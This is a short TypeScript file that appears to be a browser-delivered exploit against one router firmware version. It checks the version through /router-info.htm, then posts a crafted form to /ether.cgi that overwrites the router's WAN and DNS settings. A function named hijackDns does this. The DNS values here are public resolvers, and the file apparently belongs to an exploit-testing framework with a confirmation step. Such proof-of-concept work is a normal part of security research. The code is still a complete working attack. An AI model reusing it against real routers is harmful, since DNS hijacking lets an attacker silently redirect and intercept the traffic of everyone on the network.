import {Promise} from "es6-promise";
import ExploitUtil from "./ExploitUtil";


const TARGETED_FW_VERSIONS = [
    'V2.0.26_1.0.1NA'
];

function verifyVersion():Promise<any> {
    return new Promise((resolve, reject) => {
        let xhr = new XMLHttpRequest();
        xhr.open('GET', '/router-info.htm', true);
        xhr.onload = () => {
            if (xhr.responseType === '' || xhr.responseType === 'text') {
                let res = xhr.responseText;
                let fwVersionMatches = /FirmwareVersion:(.*?);/.exec(res);
                if (fwVersionMatches && fwVersionMatches.length >= 2) {
                    let fwVersion = fwVersionMatches[1];
                    if (TARGETED_FW_VERSIONS.indexOf(fwVersion) > -1) {
                        return resolve();
                    }
                }
            }
            return reject(new Error('Could not verify version'));
        };
        xhr.onerror = () => reject(new Error('Could not verify version'));
        xhr.send(null);
    });
}

function hijackDns():Promise<any> {
    return new Promise((resolve, reject) => {
        // TODO: Fetch current values instead of overwriting
        let formData = [
            ['system_name', ''],
            ['domain_name', ''],
            ['WANAssign', 'dhcp'],
            ['DNSAssign', '1'],
            ['DAddr1', '8'],
            ['DAddr2', '8'],
            ['DAddr3', '8'],
            ['DAddr4', '8'],
            ['PDAddr1', '8'],
            ['PDAddr2', '8'],
            ['PDAddr3', '4'],
            ['PDAddr4', '4'],
            ['MACAssign', '0'],
            ['apply', 'Apply'],
            ['runtest', 'no'],
            ['wan_proto', 'dhcp'],
            ['wan_ipaddr', '0.0.0.0'],
            ['wan_netmask', '0.0.0.0'],
            ['wan_gateway', '0.0.0.0'],
            ['wan_dns_sel', '0'],
            ['wan_dns1_pri', '8.8.8.8'],
            ['wan_dns1_sec', '8.8.4.4'],
            ['wan_hwaddr_sel', '0'],
            ['wan_hwaddr2', ''],
            ['lan_ipaddr', '0.0.0.0'],
            ['lan_netmask', '255.255.255.0']
        ].reduce((previousValue, currentValue, currentIndex) => {
            let sep = (currentIndex === 0) ? '' : '&';
            return previousValue + sep + currentValue[0] + '=' + encodeURIComponent(currentValue[1]);
        }, '');
        let xhr = new XMLHttpRequest();
        xhr.onload = () => resolve();
        xhr.onerror = () => reject(new Error('Could not hijack DNS'));
        xhr.open('POST', '/ether.cgi', true);
        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhr.send(formData);
    });
}

// Entry point
(function main() {
    ExploitUtil.confirmShouldRun()
        .then(verifyVersion)
        .then(hijackDns)
        .then(ExploitUtil.notifyDone)
        .catch(ExploitUtil.notifyError);
})();
